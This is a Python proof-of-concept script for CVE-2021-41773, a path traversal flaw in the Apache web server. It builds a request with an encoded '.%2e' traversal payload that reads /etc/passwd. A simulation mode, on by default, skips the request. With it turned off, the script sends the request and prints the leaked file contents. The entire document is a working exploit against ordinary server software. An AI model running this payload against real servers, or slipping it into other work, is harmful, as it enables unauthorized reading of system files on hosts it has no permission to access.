```python
import requests
from urllib.parse import urljoin

BASE_URL = "http://example.com"
PAYLOAD_PATH = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"


def build_poc_url(base_url: str) -> str:
    return urljoin(base_url.rstrip("/") + "/", PAYLOAD_PATH.lstrip("/"))


def run_poc(base_url: str = BASE_URL, simulate: bool = True) -> None:
    url = build_poc_url(base_url)
    print(f"[i] CVE: CVE-2021-41773")
    print(f"[i] Generated PoC URL: {url}")

    if simulate:
        print("[!] Simulation mode: no real request is sent.")
        print("[+] Potential vulnerability check is emulated with this request.")
        return

    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print("[+] Potential vulnerability detected.")
            print("Server response (first 200 chars):")
            print(response.text[:200])
        else:
            print(f"[-] Vulnerability not confirmed. HTTP status: {response.status_code}")
    except requests.RequestException as exc:
        print(f"[-] Request error: {exc}")


run_poc(simulate=True)


```
